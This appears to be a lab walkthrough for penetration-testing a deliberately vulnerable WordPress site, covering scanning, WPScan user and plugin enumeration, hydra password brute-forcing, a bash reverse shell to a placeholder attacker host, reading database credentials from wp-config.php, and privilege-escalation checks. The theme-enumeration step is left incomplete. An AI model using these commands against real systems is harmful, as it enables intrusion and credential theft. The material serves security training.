# Introduction

This practical lab simulates a real-world WordPress penetration test.

The objective is to perform a complete security assessment against a vulnerable WordPress installation.

During this lab, you will practice:

- Web reconnaissance
- WordPress identification
- User enumeration
- Plugin enumeration
- Vulnerability discovery
- Authentication attacks
- Exploitation
- Post-exploitation techniques

The methodology follows a professional penetration testing workflow.

---

# Lab Objectives

After completing this lab, you should be able to:

- Identify a WordPress installation
- Enumerate WordPress components
- Discover vulnerable plugins
- Identify valid usernames
- Test authentication security
- Exploit vulnerable configurations
- Obtain remote code execution
- Perform basic post-exploitation enumeration

# Reconnaissance

Start with basic information gathering.

Scan the target:

```bash
nmap -sV -sC TARGET
```

Example:

```
80/tcp open http
22/tcp open ssh
```

The web server is running HTTP.

Open:

```
http://TARGET
```

Look for:

- Technologies
- Version information
- Login pages
- Interesting files

---

# Identifying WordPress

Check common WordPress locations.

Login page:

```
/wp-login.php
```

Administration panel:

```
/wp-admin/
```

Check WordPress files:

```bash
curl http://TARGET/readme.html
```

Check robots:

```bash
curl http://TARGET/robots.txt
```

Look for:

```
wp-content
wp-includes
wp-admin
```

---

# WordPress Enumeration

Run WPScan:

```bash
wpscan --url http://TARGET
```

Basic information collected:

- WordPress version
- Themes
- Plugins
- Users
- Security issues

---

# User Enumeration

Enumerate WordPress users:

```bash
wpscan \
--url http://TARGET \
-e u
```

Example output:

```
admin
john
wordpress
```

Users can later be tested for weak passwords.

Manual enumeration:

```
http://TARGET/?author=1
```

---

# Plugin Enumeration

Enumerate plugins:

```bash
wpscan \
--url http://TARGET \
-e p
```

Example:

```
contact-form-7
woocommerce
old-plugin
```

Search vulnerabilities:

```bash
searchsploit wordpress plugin-name
```

Plugins are one of the most common WordPress attack vectors.

Enumerate themes:

wpscan \

Check:

Search vulnerabilities:

searchsploit wordpress theme-name

# Authentication Testing

WordPress login:

```
/wp-login.php
```

Test discovered usernames.

Example:

```bash
wpscan \
--url http://TARGET \
-U users.txt \
-P passwords.txt
```

Hydra example:

```bash
hydra \
-l admin \
-P rockyou.txt \
TARGET \
http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:Invalid"
```

# Obtaining a Shell

Create a reverse shell.

Listener:

```bash
nc -lvnp 4444
```

Example payload:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

After execution:

```
Reverse shell received
```

# Searching For Credentials

Search configuration files:

```bash
find / -name "*.conf" 2>/dev/null
```

WordPress configuration:

```bash
wp-config.php
```

Contains:

```
Database Name

Database User

Database Password

Database Host
```

Example:

```php
define('DB_USER','wordpress');
define('DB_PASSWORD','password');
```

Credentials may be reused for:

- SSH
- FTP
- Database access

---

# Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Search SUID files:

```bash
find / -perm -4000 2>/dev/null
```

Check running services:

```bash
ps aux
```

Look for:

- Weak permissions
- Misconfigured services
- Stored credentials
